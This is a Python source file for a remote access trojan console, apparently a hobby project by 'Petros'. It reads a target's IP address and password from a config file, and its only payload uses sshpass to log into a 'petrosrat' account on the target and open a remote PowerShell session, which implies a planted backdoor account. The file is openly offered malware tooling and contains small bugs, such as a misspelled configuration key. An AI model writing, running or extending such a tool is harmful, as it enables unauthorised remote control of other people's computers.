#!/usr/bin/python3
# python console for RAT
# created by Petros

# imports
import os
import sys
import getpass
from paramiko import SSHClient
from  modules import *



# variables
banner = """
 ___         _                    
 | _ \  ___  | |_   _ _   ___   ___
 |  _/ / -_) |  _| | '_| / _ \ (_-<
 |_|   \___|  \__| |_|   \___/ /__/
                                   
  ___     _     _____              
 | _ \   /_\   |_   _|             
 |   /  / _ \    | |               
 |_|_\ /_/ \_\   |_|               
                                   
"""
help_menu = """
        [::] The Only RAT You'le Ever Need [::]
        [::] Created by Petros [::]

        Arguments
            XXX.rat = configuration file to add to RAT

        Example:
            python3 main.py petros.rat
"""

options_menu = """
        [*] Select A Number To Select a Payload [*]
        
        
        Payloads:
            [0] Remote Console
            [1] 
"""

username = getpass.getuser()
header =f"{username}@RAT $ " 

# read config file
def read_config(config_file):
    configuration = {}
    # get file contents
    read_lines = open(config_file, "r").readlines()

    # get target configurations
    configuration["IP ADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORIKING DIRECTORY"] = read_lines[2].strip()
    return configuration



# detects os
def os_detection():
    # windows
    if os.name == "nt":
        return "w"
    # other
    if os.name == "posix":
        return "l"


# connects RAT to target
def connect(ipv4, password):
    # remotely connect
    os.system(f"sshpass -p \"{password}\" ssh petrosrat@{ipv4} 'powershell'")


# terminates the programm
def exit():
    sys.exit()


# command line interface
def cli(arguments):
    # display the banner
    print(banner)

    #if arguments exist
    if arguments:
        print(options_menu)

        config_file = input(f"{header}")

        try:
            configuration = read_config(sys.argv[1])

        except FileNotFoundError:
            print("\n[!!] File Does Not Exist [!!]")
            exit()

        # get config info
        ipv4 = configuration.get("IP ADDRESS")
        password = configuration.get("PASSWORD")
        working_directory = configuration.get("WORKING DIRECTORY")



        if config_file == "0":
            connect(ipv4, password)

    # if arguments dont exist
    else:
        print(help_menu)

# main code
def main():
    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True
    # run command line interface
    cli(arguments_exist)

# runs main code
if __name__ == "__main__":
    main()